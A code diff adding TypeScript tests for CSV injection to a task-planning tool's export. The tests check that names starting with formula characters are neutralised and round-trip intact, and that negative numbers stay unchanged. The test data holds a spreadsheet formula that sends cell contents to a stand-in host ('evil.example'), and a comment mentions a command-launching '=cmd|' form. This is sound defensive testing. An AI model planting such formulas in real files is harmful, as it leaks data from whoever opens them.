@@ -3,6 +3,7 @@ import { test } from "node:test";
 
 import { at } from "../testing.ts";
 import {
+  createTask,
   emptyDocument,
   normalizeDocument,
   readBundle,
@@ -197,4 +198,52 @@ test("まとめたファイルの壊れた 1 件は既定値に落ちる", () =>
   const broken = at(loaded, 1);
   assert.equal(broken.name, "project 2");
   assert.deepEqual(broken.document.tasks, []);
+});
+
+/**
+ * CSV インジェクション。`=`・`+`・`-`・`@` で始まるセルは、表計算ソフトで
+ * 開いた瞬間に**式として実行される** (`=HYPERLINK(…)` で外へ送る、
+ * `=cmd|…` で別のプログラムを起こす)。タスク名もグループも利用者が書いた
+ * 文字列で、共有されたファイルを別の人が開く。
+ */
+test("式に見える名前は、表計算ソフトで式にならない形で書き出す", () => {
+  const dangerous = [
+    '=HYPERLINK("https://evil.example/?"&A1,"x")',
+    "+1+1",
+    "-2+3",
+    "@SUM(1)",
+    "\t=1",
+    "\r=1",
+  ];
+  const tasks = dangerous.map((name) => ({
+    ...createTask(),
+    name,
+    group: name,
+  }));
+  const csv = projectToCsv(buildRows(tasks));
+  for (const line of csv.split("\n").slice(1)) {
+    // level,name,group,... の name と group の欄。
+    const cells = line.match(/("([^"]|"")*"|[^,]*)/g)?.filter((cell) => cell !== "") ?? [];
+    for (const cell of cells.slice(1, 3)) {
+      const text = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
+      assert.ok(!/^[=+\-@\t\r]/.test(text), `式として読まれる: ${JSON.stringify(text)}`);
+    }
+  }
+  // 読み戻すと元の名前に戻る (印のために足した ' は外す)。
+  assert.deepEqual(
+    csvToTasks(csv).map((task) => [task.name, task.group]),
+    dangerous.map((name) => [name.trim(), name.trim()]),
+  );
+});
+
+test("数値の欄はそのまま書く (負の数を式として潰さない)", () => {
+  const task = {
+    ...createTask(),
+    name: "a",
+    min: "-1",
+    likely: "2",
+    max: "3",
+  };
+  const csv = projectToCsv(buildRows([task]));
+  assert.match(csv, /,-1,2,3,/);
 });
